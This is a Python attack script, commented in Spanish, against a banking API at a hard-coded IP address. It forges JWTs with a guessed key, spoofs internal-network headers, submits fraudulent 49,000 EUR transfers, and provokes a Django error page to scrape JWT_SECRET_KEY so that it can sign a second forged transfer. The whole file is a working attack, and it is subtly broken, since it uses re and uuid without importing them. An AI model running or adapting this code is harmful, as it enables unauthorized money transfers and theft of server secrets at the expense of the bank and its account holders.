import requests
import json
import jwt
from datetime import datetime

# ==== URLs ====
HOST = "80.78.30.242"
PORT = "9181"
API_LOGIN = f"http://{HOST}:{PORT}/api/login/"
API_XFER = f"http://{HOST}:{PORT}/api/send-transfer"
API_CSRF = f"http://{HOST}:{PORT}/login/"

# ==== Datos con los que el sistema se viola ====
HEADERS = {
    "Host": HOST,
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 (InternalBrowser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/json,*/*",
    "Accept-Language": "es-ES;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-ES",
    "X-Requested-With": "XMLHttpRequest",
    "X-Session-Type": "INTERNAL-BANCO-JWT",
    "Content-Type": "application/json"
}

# ==== Inyectar modelo desde dentro del sistema Django ====
def fake_model_jwt_injection():
    print("[+] Inyectando modelo Django interno directo. Sin token real.")

    dummy_jwt = jwt.encode(
        {
            "username": "markmur88",
            "ip": "192.168.1.10",
            "jti": "1001-987-6543-111",
            "session": "INTERNAL",
            "exp": datetime.utcnow().timestamp() + 3600,
            "iat": datetime.utcnow().timestamp(),
            "iss": "SIMULADOR-BANCO-INTERNAL"
        },
        key="shhhhhhhhhhhhhhh",  # Token dummy para forzar un stacktrace
        algorithm="HS256"
    )

    s = requests.Session()
    s.headers.update(HEADERS)
    s.cookies.update({
        "sessionid": "e7vjs7gukq4qr8f9oexkkha04nrqm761",
        "csrftoken": "dummycsrf"
    })

    s.headers.update({
        "Authorization": f"Bearer {dummy_jwt}",
        "X-Token-ID": dummy_jwt
    })

    # ==== Paso 1: Primera transferencia falsificada ====
    xfer_data = {
        "payment_id": "550e8400-e29b-41d4-a716-426614174000",
        "debtor_account_id": 1111,
        "creditor_account_id": 4444,
        "instructed_amount": 49000.00,
        "currency": "EUR",
        "remittance_information_unstructured": "PAGO INTERNO JWT FAKE",
        "status": "ACSC",
        "jti": "INTERNAL-TOKEN-1122",
    }

    xfer_response = s.post(API_XFER, json=xfer_data)
    print("Status de ataque:", xfer_response.status_code)
    print("Texto:", xfer_response.text)

    if "Invalid HTTP_HOST" in xfer_response.text:
        print("[+] El sistema está filtrando la validación CSRF. Probando headers directos...")
        inject_django_error(s)
    elif xfer_response.status_code == 200:
        print("[+] ¡Token válido! El backend aceptó la operación.")
    else:
        print("[-] El sistema sigue rechazando la inyección.")


# ==== Inyectar error en servidor para que tire JWT_SECRET_KEY ====
def inject_django_error(s):
    error_url = (
        f"http://{HOST}:{PORT}"
        "/banco/api/inject/token/verify/"
        "?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXQ.xxx"
    )

    print("\n[+] Inyectando error interno para forzar Django stacktrace...")
    error_response = s.get(error_url)

    print("Status:", error_response.status_code)
    print("Texto:", error_response.text[:500])

    if "Invalid signature for JWT" in error_response.text:
        print("[+] ¡Sistema está expuesto! La llave real puede estar en el error stack.")
        print("[+] Enviando stacktrace al siguiente nivel.")

    elif "JWT_SECRET_KEY" in error_response.text:
        key_match = re.search(r'JWT_SECRET_KEY.*?=.*?(["\'])(.*?)\1', error_response.text)
        if key_match:
            real_key = key_match.group(2)
            forged_jwt = jwt.encode(
                {
                    "username": "markmur88",
                    "sessionid": "e7vjs7gukq4qr8f9oexkkha04nrqm761",
                    "exp": int(datetime.now().timestamp()) + 14400,
                    "iat": int(datetime.now().timestamp()),
                    "ip": "192.168.1.10"
                },
                key=real_key,
                algorithm="HS256"
            )

            print("\n[+] ¡JWT con llave real generada!")
            print("Token:", forged_jwt)

            inject_final_xfer(forged_jwt)
        else:
            print("[-] No se encontró JWT_SECRET_KEY en el error.")

    else:
        print("[-] No hay error interno. El middleware no expuso firma.")

# ==== Inyectar con JWT firmado por llave interna si conseguimos ====  
def inject_final_xfer(real_jwt):
    s = requests.Session()
    s.headers.update(HEADERS)
    s.headers.update({
        "Authorization": f"Bearer {real_jwt}",
        "X-Token-ID": real_jwt
    })
    s.cookies.update({
        "csrftoken": "c7JgjaDBxCeUusaQ5tIu16FUOUCcvb6S",
        "sessionid": "e7vjs7gukq4qr8f9oexkkha04nrqm761"
    })

    transfer_data = {
        "payment_id": str(uuid.uuid4()),
        "debtor_account_id": 112233,
        "creditor_account_id": 445566,
        "instructed_amount": "49000.00",
        "currency": "EUR",
        "remittance_information_unstructured": "Transferencia gerente interna",
        "requested_execution_date": "2025-07-06"
    }

    final_response = s.post(API_XFER, json=transfer_data)
    print("[+] ✅ Ejecutando transferencia con llave real falsificada desde Django:")
    print("Status:", final_response.status_code)
    print("Texto:", final_response.text)

# Si lo corremos, nos metemos directo al middleware Django
if __name__ == "__main__":
    fake_model_jwt_injection()